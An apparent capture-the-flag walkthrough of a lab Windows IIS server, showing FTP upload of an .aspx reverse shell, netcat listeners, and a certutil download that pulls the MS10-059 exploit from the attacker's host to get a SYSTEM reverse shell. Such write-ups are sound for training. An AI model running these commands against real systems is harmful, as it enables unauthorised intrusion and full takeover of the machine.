## Recon

Lets kick off our enumeration stage with `nmap`.

`nmap -sC -sV -p -A 10.129.141.58 -oN nmap.result`


![nmap-res-02]()


We have got:

+ FTP server with anonymous logins on port 21.
+ An IIS web server on port 80.

Lets start by connecting to the FTP and see if we can write files, or find anything interesting. 


### FTP 

Lets login: 

![ftp-login-03]()


This is the root of the web server, `iisstart.htm` is the html for the site.
The `welcome.png` is what we see if we open the site: 

![site-04]()


If we can upload files to the FTP, we might be able to access them from the URL.
Lets see if we can write to the FTP: 

![ftp-put-05]()


We can. Next logical step is to upload a reverse shell and run it from the URL.
Since this is a Microsoft IIS server we should use an `.aspx` reverse shell. 

`.aspx` are webpages generated by the ASP.NET framework running on Microsoft web servers. 
When we access a `.aspx` file via the URL, it should render out the webpage, 
(A.K.A executing the file...)


I found a great `.aspx` reverse shell [here](https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx). Make sure to update your IP and port: 

![aspx-sock-05]()


Lets upload it via the FTP: 

![aspx-upload-06]()


Setup the listener with `nc -lnvp 9001`


And navigate to the file via the browser at `http://10.129.141.111/rshell.aspx` : 

![browse-07]()


It stalls, great sign, lets check the listener: 

![shell-08]()


We get a shell! Lets move to privilege escalation. 


## Privilege Escalation

In order to run winpeas we need a .NET version of 4.5.2 or higher, which we dont have:
`reg query "HKLM\SOFTWARE\Microsoft\Net Framework Setup\NDP"`

![net-ver-09]()


So we cant run winpeas, how about PoweUp?, for that we need a powershell session. 
Trying to load a powershell session stalls indefinitely:

![ps-stall-10]()


So we cant run winpeas and we cant run powershell. lets try running [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester). 
(make sure you install xlrd with `pip2 install xlrd==1.2.0`)

First we need to save the output of `systeminfo` from the target to a file on our attack machine. 
then we can run the exploit-suggester as such: 

`./windows-exploit-suggester.py --database 2023-07-18-mssb.xls --systeminfo systeminfo.txt`


![sugg-res-11]()


Iv'e highlighted `ms10-059`, this vulnerability lays in the `Tracing for Services` feature on
Windows systems. This happens because the feature incorrectly places ACL's on registry keys,
which allows attackers to execute code with elevated privileges. As well unsafe memory allocation when processing craftred long strings.    

You can find the exploit [here](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059) save the `MS10-059.exe` file to your attack machine.


Lets transfer the exploit to our target machine. 
open an http server locally with `python3 -m http.server 8888`.

`cd` into a writable directory `cd c:\\windows\\temp` and download the exploit from the target
with `certutil -urlcache -f http://10.10.14.21:8888/MS10-059.exe ms.exe`

![transfer-12]()


Start up the listener on the attack machine with `nc -lnvp 443`.

And run the exploit with `ms.exe 10.10.14.21 443`

![run-exploit-13]()


Lets check the listener: 

![root-14]()


We got system!
